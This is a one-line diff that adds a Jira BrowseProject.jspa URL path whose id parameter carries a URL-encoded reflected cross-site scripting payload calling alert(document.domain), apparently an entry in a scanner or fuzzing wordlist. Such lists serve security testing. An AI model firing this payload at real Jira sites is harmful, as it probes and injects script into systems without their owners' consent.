@@ -1,0 +1,1 @@
+/jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
